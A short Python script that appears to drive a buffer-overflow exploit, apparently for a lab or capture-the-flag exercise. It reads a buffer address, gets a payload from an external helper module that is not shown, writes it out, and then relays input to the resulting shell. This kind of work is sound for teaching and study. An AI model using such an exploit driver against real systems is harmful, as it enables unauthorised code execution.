#!/usr/bin/python3

import sys

# read the address of the buffer
address = input("")
if (address.find("0x") == 0):
	address = address[2:]
address = int(address, 16)

# build the exploit
from exploit_helper import build_exploit
exploit = build_exploit(address)

# output the exploit
sys.stdout.buffer.write(exploit)
with open("exploit", "wb") as xfile:
	xfile.write(exploit)


# forward any input to the shell
while (True):
	print(input(""))

